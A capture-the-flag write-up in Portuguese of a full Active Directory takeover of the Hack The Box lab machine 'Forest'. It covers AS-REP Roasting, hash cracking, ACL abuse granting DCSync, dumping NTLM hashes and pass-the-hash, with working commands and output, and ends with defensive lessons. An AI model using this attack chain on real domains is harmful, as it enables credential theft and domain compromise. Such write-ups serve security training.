# Write-up: Forest - Hack The Box

> Data: 21 de Maio de 2026  
> Target IP: `10.129.1.191`

![STATUS](https://img.shields.io/badge/STATUS-COMPROMETIMENTO%20TOTAL-brightgreen?style=flat-square) ![INITIAL ACCESS](https://img.shields.io/badge/INITIAL%20ACCESS-AS--REP%20ROASTING-grey?style=flat-square) ![PRIVESC](https://img.shields.io/badge/PRIVESC-DCSYNC%20ATTACK-orange?style=flat-square) ![AD](https://img.shields.io/badge/ACTIVE%20DIRECTORY-WRITEDACL%20ABUSE-red?style=flat-square) ![TECHNIQUE](https://img.shields.io/badge/TECHNIQUE-PASS--THE--HASH-blue?style=flat-square)

O desafio **Forest** é um Domain Controller Windows Server 2016 com Active Directory, focado em enumeração anônima de usuários via RPC, exploração de Kerberos misconfiguration (AS-REP Roasting) e abuso de permissões mal configuradas no AD (Account Operators → Exchange Windows Permissions → WriteDACL → DCSync) para obter controle total do domínio.

---

## 🗺️ Cadeia de Ataque

```
Nmap → DC Windows Server 2016 (portas 88, 389, 445, 5985)
         ↓
RPC anônimo → enumdomusers → 6 usuários reais encontrados
         ↓
AS-REP Roasting → svc-alfresco sem Kerberos pré-autenticação
         ↓
John + rockyou → senha: s3rvice
         ↓
Evil-WinRM → shell como svc-alfresco
         ↓
BloodHound/SharpHound → mapeamento do AD
         ↓
Account Operators → cria usuário ralph
         ↓
Exchange Windows Permissions → WriteDACL no domínio
         ↓
PowerView → Add-ObjectACL → DCSync rights
         ↓
impacket-secretsdump → dump de todos os hashes NTDS
         ↓
Pass-the-Hash → Administrator → root.txt 🏆
```

---

## 🔍 Fase 1 - Reconhecimento

### Configuração inicial

```bash
echo "10.129.1.191 forest.htb htb.local FOREST.htb.local" | sudo tee -a /etc/hosts
```

### Scan de Portas

```bash
nmap -sV -sC -T4 -Pn 10.129.1.191
```

**Resultado:**
```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Análise:** Esse é um Domain Controller clássico. As portas que mais importam aqui:
- `88` (Kerberos) → AS-REP Roasting
- `389/3268` (LDAP) → Enumeração de usuários
- `445` (SMB) → Enumeração sem credenciais
- `5985` (WinRM) → Shell remoto após obter credenciais

---

## 🔍 Fase 2 - Enumeração de Usuários

### RPC Anônimo

O DC permite sessões anônimas via RPC, isso nos dá a lista completa de usuários do domínio:

```bash
rpcclient -U "" -N 10.129.1.191 -c "enumdomusers"
```

**Resultado (filtrado - só os usuários reais):**
```
user:[Administrator]  rid:[0x1f4]
user:[sebastien]      rid:[0x479]
user:[lucinda]        rid:[0x47a]
user:[svc-alfresco]   rid:[0x47b]
user:[andy]           rid:[0x47e]
user:[mark]           rid:[0x47f]
user:[santi]          rid:[0x480]
```

O que chamou minha atenção aqui: `svc-alfresco` é uma **service account**. Essas contas frequentemente têm "Do not require Kerberos preauthentication" habilitado no AD. Anotei isso pra testar no próximo passo.

---

## 💥 Fase 3 - AS-REP Roasting

### Criando wordlist de usuários

```bash
cat > forest_users.txt << 'EOF'
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
EOF
```

### Testando AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/ -usersfile forest_users.txt -no-pass -dc-ip 10.129.1.191
```

**Resultado:**
```
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:cfe8c72b7015d2ab3746fa97...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Confirmado! `svc-alfresco` tem `UF_DONT_REQUIRE_PREAUTH` - pegamos o hash Kerberos AS-REP.

### Quebrando o Hash

```bash
echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:cfe8c72b...' > svc-alfresco.hash
john svc-alfresco.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

**Credenciais obtidas:** `svc-alfresco:s3rvice`

---

## 🖥️ Fase 4 - Acesso Inicial

### Evil-WinRM

Porta 5985 aberta + credenciais válidas = shell direto:

```bash
evil-winrm -i 10.129.1.191 -u svc-alfresco -p s3rvice
```

### User Flag

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

**Flag:** `f93xxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

### Enumeração do usuário

```powershell
whoami /groups
```

**Grupos relevantes:**
```
BUILTIN\Account Operators        ← pode criar usuários!
BUILTIN\Remote Management Users  ← acesso WinRM
HTB\Privileged IT Accounts
HTB\Service Accounts
```

O `Account Operators` é a chave aqui - esse grupo permite criar e modificar contas no domínio.

---

## 🔍 Fase 5 - BloodHound

### Coleta de dados com SharpHound

```bash
# Na Kali — baixa o SharpHound
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
```

```powershell
# No Evil-WinRM — upload e executa
upload SharpHound.exe
.\SharpHound.exe -c All

# Baixa o resultado
download 20260521194206_BloodHound.zip
```

### Análise no BloodHound

Instalei o Neo4j + BloodHound Legacy (v4.2.0) na Kali:

```bash
sudo apt install neo4j -y
sudo neo4j start

# BloodHound Legacy
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64
./BloodHound --no-sandbox
```

Importei os JSONs e rodei a query **"Find Principals with DCSync Rights"**.

O BloodHound mostrou o caminho claro:

```
svc-alfresco
    ↓ MemberOf
Account Operators
    ↓ GenericAll
Exchange Windows Permissions
    ↓ WriteDACL
HTB.LOCAL (domínio)
    ↓ DCSync
Administrator
```

---

## 🔝 Fase 6 - Privilege Escalation

### Criando um novo usuário

Usei o `Account Operators` para criar um novo usuário e adicioná-lo ao grupo privilegiado:

```powershell
# Cria o usuário
net user ralph teste123 /add /domain

# Adiciona ao Exchange Windows Permissions (que tem WriteDACL no domínio)
net group "Exchange Windows Permissions" ralph /add /domain

# Adiciona ao Remote Management Users (pra WinRM)
net localgroup "Remote Management Users" ralph /add
```

### Conectando como ralph

```bash
evil-winrm -i 10.129.1.191 -u ralph -p teste123
```

### Adicionando DCSync Rights via PowerView

Essa foi a parte mais trabalhosa. O Forest tem um **script de reversão** que remove membros dos grupos a cada poucos minutos. Tentei várias abordagens:

**O que NÃO funcionou:**
- `impacket-dacledit` → DCSync rights não eram aplicados corretamente
- `Add-DomainObjectAcl` com credenciais explícitas → "Access is denied"
- Mimikatz `lsadump::dcsync` → mesmo erro 0x20f7

**O que FUNCIONOU:**

```powershell
# Upload do PowerView
upload PowerView.ps1

# Importa com dot-sourcing (não Import-Module)
. .\PowerView.ps1

# Adiciona DCSync rights sem credenciais explícitas
# O PowerView usa o contexto do usuário atual (ralph, que já está no Exchange Windows Permissions)
Add-ObjectACL -PrincipalIdentity ralph -Credential $cred -Rights DCSync
```

A chave aqui foi usar `Add-ObjectACL` sem credenciais explícitas - o PowerView usou automaticamente o contexto do ralph (já membro do Exchange Windows Permissions) para aplicar o WriteDACL.

### DCSync - Dumpando os Hashes

**Imediatamente** após aplicar o ACL (antes do script de reversão agir):

```bash
impacket-secretsdump htb.local/ralph:teste123@10.129.1.191 -just-dc-ntlm
```

**Resultado:**
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
```

**Todos os hashes do domínio na mão.**

---

## 🏆 Fase 7 - Pass-the-Hash = Root

```bash
evil-winrm -i 10.129.1.191 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Flag:** `e27fxxxxxxxxxxxxxxxxxxxxxxxxxxx`

---



## 📚 Aprendizados

### 1. RPC anônimo é perigoso
Permitir sessões nulas no RPC expõe todos os usuários do domínio. Isso abre portas pra ataques como AS-REP Roasting e Password Spraying. Em ambientes reais, desabilite sessões anônimas no DC.

### 2. Service accounts são alvos prioritários
O `svc-alfresco` tinha Kerberos pré-autenticação desabilitada, algo muito comum em service accounts por questões de compatibilidade. O hash foi capturado sem precisar de nenhuma credencial.

### 3. Account Operators é quase um Domain Admin
Esse grupo permite criar usuários e adicioná-los a grupos. Combinado com `Exchange Windows Permissions` (que tem `WriteDACL` no domínio), o caminho pro DCSync é direto.

### 4. AD mal configurado não precisa de CVE
Não usei nenhum exploit de software. Todo o ataque foi baseado em permissões mal configuradas no Active Directory. Em pentest real, isso é extremamente comum.

### 5. Timing é tudo no Forest
O Forest tem um script que reverte permissões a cada poucos minutos. A lição: em ambientes com monitoramento ativo, precisamos ser rápidos entre a escalação e a extração.

### 6. PowerView vs impacket-dacledit
O `impacket-dacledit` nem sempre propaga os ACLs corretamente. O PowerView rodando localmente no servidor com `Add-ObjectACL` funcionou de primeira, usar o contexto do próprio usuário (já no grupo certo) ao invés de credenciais explícitas fez a diferença.

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas e serviços |
| `rpcclient` | Enumeração anônima de usuários via RPC |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `john` | Crack do hash Kerberos AS-REP |
| `evil-winrm` | Shell remoto via WinRM |
| `SharpHound` | Coleta de dados do Active Directory |
| `BloodHound` | Mapeamento visual de caminhos de ataque no AD |
| `PowerView` | Manipulação de ACLs e enumeração AD |
| `impacket-secretsdump` | DCSync - dump de hashes NTDS |
| `mimikatz` | Tentativa de DCSync local (não foi necessário) |

---

## 🔗 Referências

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HackTricks - DCSync Attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [PowerView Documentation](https://powersploit.readthedocs.io/en/latest/Recon/)
- [BloodHound - GitHub](https://github.com/BloodHoundAD/BloodHound)
- [Impacket Tools](https://github.com/fortra/impacket)

---

<div align="center">
  <p>Escrito por:</p>
  <a href="https://www.linkedin.com/in/ralph-sonato-77086b16b/"><img src="https://img.shields.io/badge/LinkedIn-Ralph_Sonato-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <p><i>Analista de Cibersegurança</i></p>
</div>
